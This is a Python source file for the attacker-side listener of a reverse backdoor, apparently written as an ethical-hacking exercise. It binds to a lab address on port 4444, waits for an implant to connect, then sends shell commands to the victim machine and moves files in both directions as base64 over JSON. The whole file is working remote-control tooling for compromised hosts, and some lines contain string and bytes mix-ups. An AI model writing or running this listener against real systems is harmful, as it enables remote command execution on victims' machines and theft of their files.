#!/usr/bin/env python
import socket, json, base64

from pip._vendor.distlib.compat import raw_input


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#setting reuse address to 1 which will allow us to
        #use the socket connection more than once
        listener.bind((ip, port))
        listener.listen(0)#to start listening
        print("[+]Waiting for incoming Connections")
        self.connection, address = listener.accept()#inorder to specify to the computer to accept connection in port 4444
        print("[+]Got a Connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
                #basically value error is obtained when we try convert partially recieved data.

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+]Download Successful"

    def run(self):
        while True:
            command = raw_input(">>")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)#appending the content of the file to the list
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
                
            print(result)


my_listener = Listener("10.0.2.15", 4444)
my_listener.run()